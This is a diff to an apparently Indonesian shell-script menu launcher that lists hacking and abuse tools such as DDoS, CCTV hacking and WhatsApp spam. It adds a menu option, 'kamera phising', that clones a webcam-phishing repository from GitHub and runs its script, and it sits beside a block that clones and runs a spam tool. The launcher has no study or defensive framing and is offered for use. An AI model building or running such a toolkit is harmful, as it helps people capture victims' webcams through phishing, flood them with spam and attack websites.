@@ -27,6 +27,7 @@ echo -e "          |6.SPLOIT-MALICIOUS    12.SPAMM          |"
 echo -e "          |13.DDOS R             14.Tools999       |"
 echo -e "          |15.DDOS WEB           16.Tools Black    |"
 echo -e "          |17.hack CCTV          18.SpamWa         |"
+echo -e "          |19.kamera phising     20.               |"
 echo -e "          |________________________________________|"
 echo
 read -p "          PILIH MENU:" HOOH
@@ -234,4 +235,14 @@ python3 -m pip install requests
 git clone https://github.com/krypton-byte/SpamWa
 cd SpamWa
 python3 spam.py
+fi
+
+if [ $HOOH == 19 ]
+then
+clear
+sleep 1
+git clone https://github.com/jasut1n/WebCamPhishing
+cd WebCamPhishing
+chmod +x webcamphish.sh
+./webcamphish.sh
 fi
